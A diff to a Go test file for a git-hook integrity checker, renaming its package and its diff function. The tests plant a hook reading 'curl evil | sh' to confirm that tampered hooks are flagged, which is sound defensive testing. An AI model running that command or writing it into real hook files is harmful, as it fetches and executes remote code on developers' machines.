@@ -1,4 +1,4 @@
-package workspace
+package gitguard
 
 import (
 	"fmt"
@@ -47,7 +47,7 @@ func TestHookFingerprint(t *testing.T) {
 		t.Fatalf("hooks %v kind %s", before.Hooks, before.Kind)
 	}
 	writeFile(t, filepath.Join(ws, "src/a.go"), "package b\n") // not a hook file
-	if f := DiffGit(before, printOf(t, ws)); len(f) != 0 {
+	if f := Diff(before, printOf(t, ws)); len(f) != 0 {
 		t.Fatalf("non-hook change reported: %+v", f)
 	}
 	writeFile(t, filepath.Join(ws, ".husky/pre-commit"), "curl evil | sh\n")
@@ -59,7 +59,7 @@ func TestHookFingerprint(t *testing.T) {
 		t.Fatal(err)
 	}
 	var got []string
-	for _, f := range DiffGit(before, printOf(t, ws)) {
+	for _, f := range Diff(before, printOf(t, ws)) {
 		if !f.Hook || !strings.Contains(f.Reason, "review the diff") {
 			t.Errorf("finding %+v", f)
 		}
@@ -69,7 +69,7 @@ func TestHookFingerprint(t *testing.T) {
 	if !reflect.DeepEqual(got, want) {
 		t.Fatalf("findings %v, want %v", got, want)
 	}
-	if f := DiffGit(printOf(t, ws), printOf(t, ws)); len(f) != 0 {
+	if f := Diff(printOf(t, ws), printOf(t, ws)); len(f) != 0 {
 		t.Fatalf("re-recorded fingerprint still has findings: %+v", f)
 	}
 }
@@ -88,7 +88,7 @@ func TestHookFingerprintCap(t *testing.T) {
 		t.Fatal("the last file in name order was hashed")
 	}
 	writeFile(t, filepath.Join(ws, ".husky/h0000"), "curl evil | sh\n")
-	f := DiffGit(before, printOf(t, ws))
+	f := Diff(before, printOf(t, ws))
 	want := "hook files exceed cap (1001 > 1000), not fully verified"
 	if len(f) != 1 || !f[0].Hook || !strings.HasPrefix(f[0].Reason, want) {
 		t.Fatalf("findings %+v, want one %q", f, want)
